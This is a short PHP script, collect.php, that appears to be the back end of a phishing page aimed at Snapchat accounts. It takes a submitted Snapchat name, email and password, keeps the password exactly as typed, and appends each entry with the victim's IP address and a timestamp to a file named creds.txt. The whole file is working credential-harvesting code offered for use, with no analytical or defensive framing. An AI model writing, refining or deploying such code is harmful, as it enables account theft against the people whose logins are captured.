<?php
// collect.php – overwrite old file with this
header('Content-Type: application/json');

$snap  = trim($_POST['snap']   ?? '');
$email = trim($_POST['email']  ?? '');
$pass  = $_POST['password']    ?? ''; // keep exact password
$ip    = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$time  = date('c'); // ISO-8601

// basic tamper check
if (!$snap || !$email || !$pass || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
    http_response_code(422);
    echo json_encode(['ok' => false, 'msg' => 'Invalid data']);
    exit;
}

// strip control chars
foreach (['snap','email'] as $k) $$k = preg_replace('/[\x00-\x1F\x7F]/', ' ', $$k);

$line  = "[$time] [$ip] Snap:$snap | Email:$email | Pass:$pass" . PHP_EOL;

// atomic append (LOCK_EX) + fail handler
if (file_put_contents('creds.txt', $line, FILE_APPEND | LOCK_EX) === false) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'msg' => 'Save failed']);
    exit;
}

echo json_encode(['ok' => true]);
?>
